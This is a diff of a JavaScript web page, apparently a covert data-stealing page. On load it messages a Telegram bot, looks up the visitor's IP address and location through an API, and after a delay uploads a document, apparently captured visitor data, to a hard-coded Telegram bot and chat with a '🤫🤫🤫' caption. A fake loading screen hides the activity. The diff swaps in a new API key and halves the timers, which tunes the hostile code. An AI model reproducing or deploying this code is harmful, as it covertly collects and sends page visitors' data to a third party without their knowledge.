@@ -2,7 +2,7 @@ var Welcome = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhM
 var oReq = new XMLHttpRequest(); 
 oReq.open("GET", Welcome, true); 
 oReq.send();
-fetch("https://api.ipbase.com/json/?apikey=QEsnoKncxteDBcncYyP1fN0DvBYzs9VZzteJdOM0")
+fetch("https://api.ipbase.com/json/?apikey=13841960-bf98-11ec-bdc4-5134c1fdde2f")
 	.then((res) => res.json())
 	.then((data) => {
 		var output = `
@@ -96,7 +96,7 @@ window.onload = function(){
 			xhr.open('POST', `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendDocument?chat_id=1603299669&caption=🤫🤫🤫`, true);
 			xhr.send(formDataToUpload);
 		});
-	},8000)
+	},4000)
 	userName();
 	Desktop();
 	var loader = document.querySelector('#loader');
@@ -104,5 +104,5 @@ window.onload = function(){
 		//loader.style.display = "none";
 		loader.style.opacity = "0"
 		loader.addEventListener('transitionend', () => loader.remove());
-	}, 7000);
+	}, 4000);
 }
